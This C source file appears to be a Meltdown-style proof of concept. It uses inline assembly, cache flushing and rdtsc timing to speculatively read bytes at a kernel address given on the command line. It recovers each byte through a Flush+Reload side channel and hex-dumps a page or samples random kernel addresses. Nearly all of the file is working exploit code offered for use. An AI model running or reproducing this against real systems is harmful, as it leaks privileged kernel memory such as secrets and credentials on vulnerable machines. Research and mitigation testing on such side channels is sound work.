/*
 * Copyright (c) 2018 mniip
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 * this list of conditions and the following disclaimer in the documentation
 * and/or other materials provided with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its
 * contributors may be used to endorse or promote products derived from this
 * software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
 * AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
 * LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF SUCH DAMAGE.
 */

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <setjmp.h>
#include <signal.h>

#include <math.h>

#ifdef VISUALIZE
int gnuplot()
{
	int pipes[2];
	if(pipe(pipes))
	{
		perror("pipe");
		exit(EXIT_FAILURE);
	}
	int pid = fork();
	if(pid < 0)
	{
		perror("fork");
		exit(EXIT_FAILURE);
	}
	if(!pid)
	{
		close(pipes[1]);
		if(dup2(pipes[0], fileno(stdin)))
		{
			perror("dup2");
			exit(EXIT_FAILURE);
		}
		execlp("gnuplot", "gnuplot", NULL);
		perror("execve");
		exit(EXIT_FAILURE);
	}
	close(pipes[0]);
	return pipes[1];
}
#endif

extern unsigned long long time_read(void const *);
asm(
".section .text\n"
".global time_read\n"
"time_read:\n"
"	mfence\n"
"	lfence\n"
"	rdtsc\n"
"	lfence\n"
"	movq %rax, %rcx\n"
"	movb (%rdi), %al\n"
"	lfence\n"
"	rdtsc\n"
"	subq %rcx, %rax\n"
"	ret\n"
);

extern void clflush(void *);
asm(
".section .text\n"
".global clflush\n"
"clflush:\n"
"	mfence\n"
"	clflush (%rdi)\n"
"	retq\n"
);

#define STR2(X) #X
#define STR(X) STR2(X)

#define PAGE_SIZE 4096
#define PTRS_PER_PAGE (PAGE_SIZE / sizeof(uint64_t))
#define POISON_LEN (PTRS_PER_PAGE * 1 - 1)
#define POISON_SKIP_RATE 4 // better be a divisor of PTRS_PER_PAGE

extern void poison_speculate(void **, long int *, char (*)[4096]);
asm(
".section .text\n"
".global poison_speculate\n"
"poison_speculate:\n"
"	addq $8*" STR((POISON_SKIP_RATE - 1)) ", %rdi\n"
"	addq $8*" STR((POISON_SKIP_RATE - 1)) ", %rsi\n"
"1:\n"
"	xorl %eax, %eax\n"
"	movq (%rdi), %r15\n"
"	prefetcht0 (%r15)\n"
"	movl (%rsi), %r14d\n"
"	testl %r14d, %r14d\n"
"	jnz 2f\n"
"	movb (%r15), %al\n"
"	shlq $12, %rax\n"
"	incb (%rdx, %rax)\n"
"	addq $8*" STR(POISON_SKIP_RATE) ", %rdi\n"
"	addq $8*" STR(POISON_SKIP_RATE) ", %rsi\n"
"	jmp 1b\n"
"2:	retq\n"
);

#define TENFOLD(x) x x x x x x x x x x
extern void stall_speculate(void *, char (*)[4096]);
asm(
".section .text\n"
".global stall_speculate\n"
"stall_speculate:\n"
"	mfence\n"
"	call 1f\n"
"	movzbl (%rdi), %eax\n"
"	shll $12, %eax\n"
"	movq (%rsi, %rax), %rcx\n"
"1:	xorps %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	movd %xmm0, %eax\n"
"	lea 8(%rsp, %rax), %rsp\n"
"	ret\n"
);

#ifndef POISON
jmp_buf restore;
void signal_action(int signal, siginfo_t *si, void *u)
{
	longjmp(restore, 1);
}
#endif

typedef struct
{
	char (*mapping)[PAGE_SIZE];
#ifdef POISON
	void **pointers;
	uint64_t *isspec;
	char *defval;
#endif
}
channel;

void open_channel(channel *ch)
{
	ch->mapping = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(ch->mapping == MAP_FAILED)
	{
		perror("mmap mapping");
		exit(EXIT_FAILURE);
	}
	memset(ch->mapping, 0, PAGE_SIZE * 256);

#ifdef POISON
	ch->pointers = mmap(NULL, (POISON_LEN + 1) * sizeof(void *), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(ch->pointers == MAP_FAILED)
	{
		perror("mmap pointers");
		exit(EXIT_FAILURE);
	}

	ch->isspec = mmap(NULL, (POISON_LEN + 2) * sizeof(uint64_t), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(ch->isspec == MAP_FAILED)
	{
		perror("mmap isspec");
		exit(EXIT_FAILURE);
	}
	ch->isspec++;

	ch->defval = malloc(1);
	*(ch->defval) = 0;

	for(int r = 0; r < POISON_LEN; r++)
	{
		ch->pointers[r] = ch->defval;
		ch->isspec[r] = 0;
	}
	ch->isspec[POISON_LEN] = 1; // first element placed on the second page
#endif
}

void free_channel(channel *ch)
{
	munmap(ch->mapping, PAGE_SIZE * 256);
#ifdef POISON
	free(ch->defval);
	munmap(ch->pointers, (POISON_LEN + 1) * sizeof(void *));
	munmap(ch->isspec - 1, (POISON_LEN + 2) * sizeof(uint64_t));
#endif
}

void poke_kernel()
{
	syscall(0, -1, 0, 0);
}

char test_one = 1;
int dump = 0;

#define ITERATIONS 2000

#define TIME_DIVS 50
#define TIME_BUCKET 8
int timing[256][TIME_DIVS];

void collect_stats(channel *ch, void *addr)
{
	for(int ms = 0; ms < TIME_DIVS; ms++)
		for(int line = 0; line < 256; line++)
			timing[line][ms] = 0;

#ifdef POISON
	ch->pointers[POISON_LEN] = addr;
#endif
	
	for(int line = 0; line < 256; line++)
	{
		for(int i = 0; i < ITERATIONS; i++)
		{
			clflush(ch->mapping[line]);

			poke_kernel();
#ifdef POISON
			clflush(&ch->isspec[POISON_LEN]);
			poison_speculate(ch->pointers, ch->isspec, ch->mapping);
#else
			//if(!setjmp(restore))
			stall_speculate(addr, ch->mapping);
#endif
		
			unsigned long long t = time_read(ch->mapping[line]);
			if(t / TIME_BUCKET < TIME_DIVS)
				timing[line][t / TIME_BUCKET]++;
		}
	}
}

int median(int *arr, int len)
{
	int sum = 0;
	for(int i = 0; i < len; i++)
		sum += arr[i];
	int total = 0;
	for(int i = 0; i < len; i++)
	{
		total += arr[i];
		if(total >= sum / 2)
			return i;
	}
	return len;
}

int cutoff_time;
int calculate_cutoff(channel *ch)
{
#ifdef POISON
	collect_stats(ch, &test_one);
	int med_hit = median(timing[0], TIME_DIVS) * TIME_BUCKET;
	int med_miss = median(timing[128], TIME_DIVS) * TIME_BUCKET;
	cutoff_time = (med_hit + med_miss) / 2;
#else
	collect_stats(ch, NULL);
	int med_miss = median(timing[128], TIME_DIVS) * TIME_BUCKET;
	cutoff_time = med_miss / 2;
#endif
}

#define PROB_HIT_ACCIDENTAL 0.0005
#define PROB_HIT_FAILS 0.9995
int hit_timing[256];
int miss_timing[256];
int run_timing_once(channel *ch, void *addr, double *uncertainty)
{
	for(int line = 0; line < 256; line++)
		hit_timing[line] = miss_timing[line] = 0;

#ifdef POISON
	ch->pointers[POISON_LEN] = addr;
#endif
	
	for(int line = 0; line < 256; line++)
	{
		for(int i = 0; i < ITERATIONS; i++)
		{
			clflush(ch->mapping[line]);

			poke_kernel();
#ifdef POISON
			clflush(&ch->isspec[POISON_LEN]);
			poison_speculate(ch->pointers, ch->isspec, ch->mapping);
#else
			//if(!setjmp(restore))
			stall_speculate(addr, ch->mapping);
#endif
		
			unsigned long long t = time_read(ch->mapping[line]);
			(t < cutoff_time ? hit_timing : miss_timing)[line]++;
		}
	}

	int max_line = 0;
	for(int line = 1; line < 256; line++)
		if(max_line == 0 ? hit_timing[line] > 0 : hit_timing[line] > hit_timing[max_line])
			max_line = line;
	
	if(max_line)
	{
		*uncertainty = pow(PROB_HIT_ACCIDENTAL, hit_timing[max_line]);
		for(int line = 1; line < 256; line++)
			if(line != max_line && hit_timing[line])
				*uncertainty = 1.0 - (1.0 - *uncertainty) * pow(PROB_HIT_ACCIDENTAL, hit_timing[line]);
	}
	else
	{
		*uncertainty = pow(PROB_HIT_FAILS, ITERATIONS);
	}
	return max_line;
}

//#define MAX_UNCERTAINTY 5.4e-20
#define MAX_UNCERTAINTY 8.636e-78
#define MAX_RETRIES 100
double distribution[256];
int read_byte(channel *ch, void *addr, int verbose)
{
	for(int line = 0; line < 256; line++)
		distribution[line] = 1.0 / 256;
	int val = -1;
	if(verbose)
		printf("%20.13g %02x", 0, 0);
	while(val == -1)
	{
		double unc;
		int newval = run_timing_once(ch, addr, &unc);
		for(int line = 0; line < 256; line++)
			if(line != newval)
				distribution[line] = fmin(1.0, distribution[line] / unc);
		distribution[newval] *= unc;

		for(int line = 0; line < 256; line++)
			if(distribution[line] < MAX_UNCERTAINTY)
				val = line;

		int md = 0;
		for(int line = 0; line < 256; line++)
			if(distribution[line] < distribution[md])
				md = line;

		if(verbose)
			printf("\e[23D%20.13g %02x", distribution[md], md); fflush(stdout);
	}
	if(verbose)
		printf("\e[23D");
	return val;
}

int main(int argc, char *argv[])
{

	void *addr;
	if(argc < 2 || sscanf(argv[1], "%p", &addr) != 1)
	{
		fprintf(stderr, "Usage: %s 0xffff????????????\n", argv[0]);
		exit(EXIT_FAILURE);
	}

#ifndef POISON
	struct sigaction sa;
	sa.sa_sigaction = signal_action;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_NODEFER | SA_SIGINFO;
	sigaction(SIGSEGV, &sa, NULL);
#endif

	channel ch;
	open_channel(&ch);

#ifdef VISUALIZE
	int plot = gnuplot();
	dprintf(plot, "set yrange [0:" STR(TIME_BUCKET * TIME_DIVS) "]\n");
	dprintf(plot, "set xrange [0:255]\n");
	dprintf(plot, "set cbrange [0:10]\n");
	dprintf(plot, "set terminal qt size 1024,256\n");
	while(1)
	{
		collect_stats(&ch, addr);

		dprintf(plot, "plot '-' u 1:($2*" STR(TIME_BUCKET) "):3 matrix with image pixels\n");
		for(int ms = 0; ms < TIME_DIVS; ms++)
		{
			for(int line = 0; line < 256; line++)
				dprintf(plot, "%d ", timing[line][ms]);
			dprintf(plot, "\n");
		}
		dprintf(plot, "e\ne\n");
	}
#else

	calculate_cutoff(&ch);
	printf("cutoff: %d\n", cutoff_time);
#ifdef RANDOMIZE
	while(1)
	{
		void *a = addr + rand() % 0x481f00000;
		int val = read_byte(&ch, a, 1);
		if(val > 0)
			printf("%p: %02x\n", a, val);
	}
#else
	for(int ln = 0; ln < 4096 / 16; ln++)
	{
		printf("%p | ", addr + ln * 16);
		for(int p = 0; p < 16; p++)
		{
			int val = read_byte(&ch, addr + ln * 16 + p, 1);
			if(val == -1)
				printf("?? ");
			else
				printf("%02x ", val);
			fflush(stdout);
		}
		printf("\n");
	}
#endif
#endif
}
